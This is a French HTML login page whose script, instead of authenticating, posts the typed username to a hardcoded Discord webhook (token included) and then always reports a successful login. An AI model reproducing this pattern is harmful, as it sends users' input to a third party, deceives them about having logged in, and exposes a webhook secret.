<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Se connecter</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f2f2f2;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .form-container {
      background-color: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }

    .form-container h2 {
      margin-bottom: 20px;
      color: #222;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    button {
      background-color: #00b2ff;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 15px;
    }

    button:hover {
      background-color: #0090d1;
    }

    .link {
      display: block;
      margin-top: 15px;
      text-decoration: underline;
      color: #0077cc;
      cursor: pointer;
    }
    
    .link:hover {
      color: #005fa3;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>Se connecter</h2>
    <input id="username" type="text" placeholder="Nom d'utilisateur" />
    <input type="password" placeholder="Mot de passe" />
    <button id="login-button">Se connecter</button>
    <a class="link" href="index.html">Créer un compte</a>
  </div>

  <!-- Notification Discord via Webhook lors de la connexion -->
  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1358389159127154748/Xt096LVu3tzwb-Pc8KK1wwrIuzN4ubavLDXafCoYaw6FgwG5RLE232xY0ItvJUyxUC3E"; // Remplacez par votre URL de webhook Discord

    document.getElementById('login-button').addEventListener('click', async function(event) {
      event.preventDefault();
      const username = document.getElementById('username').value;

      // Message de notification
      const data = {
        content: `**Tentative de connexion**\nUtilisateur : ${username}`
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });

      alert('Connexion réussie !');
    });
  </script>

  <!-- Dynamisation du pseudo utilisateur -->
  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('username');
    if (username) {
      const userNameElements = document.querySelectorAll('.user-name');
      userNameElements.forEach(element => {
        element.textContent = username;
      });
    }
  </script>
</body>
</html>
